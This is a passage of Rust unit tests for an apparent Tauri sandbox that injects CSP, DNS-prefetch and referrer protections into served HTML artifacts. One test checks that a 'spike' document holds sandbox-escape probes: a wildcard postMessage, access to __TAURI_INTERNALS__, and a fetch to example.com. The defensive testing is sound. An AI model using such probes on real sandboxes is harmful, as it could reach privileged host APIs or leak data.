        assert!(ARTIFACT_BRIDGE.contains(ARTIFACT_BRIDGE_MARKER));
    }

    #[test]
    fn bridge_carries_dns_prefetch_and_referrer_metas() {
        // Defense-in-depth: the two metas closing the DNS-prefetch + referrer channels (which
        // CSP connect-src 'none' does not govern) must ride the bridge into EVERY artifact.
        assert!(
            ARTIFACT_BRIDGE.contains(r#"<meta http-equiv="x-dns-prefetch-control" content="off">"#),
            "bridge must carry the dns-prefetch-control meta"
        );
        assert!(
            ARTIFACT_BRIDGE.contains(r#"<meta name="referrer" content="no-referrer">"#),
            "bridge must carry the no-referrer meta"
        );
        // The metas sit AFTER the guard-bearing </script>, so the guard is still the exact prefix.
        assert!(
            ARTIFACT_BRIDGE.starts_with(ARTIFACT_BRIDGE_GUARD),
            "guard must remain the prefix even with metas appended"
        );
        // A served document actually carries both metas.
        let served = inject_bridge("<!DOCTYPE html><html><head></head><body>x</body></html>");
        assert!(served.contains("x-dns-prefetch-control"), "served doc missing dns meta");
        assert!(served.contains("no-referrer"), "served doc missing referrer meta");
    }

    // ---- sample + spike docs ---------------------------------------------

    #[test]
    fn sample_doc_is_interactive_and_self_contained() {
        assert!(SAMPLE_DOC.contains("<!DOCTYPE html>"));
        assert!(SAMPLE_DOC.contains("addEventListener('click'"), "needs a clickable counter");
        // CDN-loaded lib check uses an allowlisted origin.
        assert!(SAMPLE_DOC.contains("https://cdnjs.cloudflare.com"));
        // No inline on*= handler attributes (we wire via addEventListener / DOM props).
        assert!(!SAMPLE_DOC.contains("onclick="));
        assert!(!SAMPLE_DOC.contains("onload="));
        // Self-contained: no http(s) src/href to anything outside the CDN check above.
        assert!(!SAMPLE_DOC.contains("href=\"http"));
        // The sample itself carries NO bridge / NO CSP meta (the serve path adds them).
        assert!(!SAMPLE_DOC.contains(ARTIFACT_BRIDGE_MARKER));
        assert!(!SAMPLE_DOC.contains("Content-Security-Policy"));
    }

    #[test]
    fn spike_doc_preserved_for_a_b_e2e() {
        assert!(SPIKE_DOC.contains("postMessage(payload, '*')"));
        assert!(SPIKE_DOC.contains("__TAURI_INTERNALS__"));
        assert!(SPIKE_DOC.contains("fetch('https://example.com'"));
        assert!(SPIKE_DOC.contains("t: 'spike'"));
    }

    #[test]
    fn served_sample_carries_the_bridge() {
        // What the `/__sample__` route returns: the sample WITH the bridge injected.
        let served = inject_bridge(SAMPLE_DOC);
        assert!(served.contains(ARTIFACT_BRIDGE_MARKER));
        assert!(served.contains("addEventListener('click'"));
    }
}
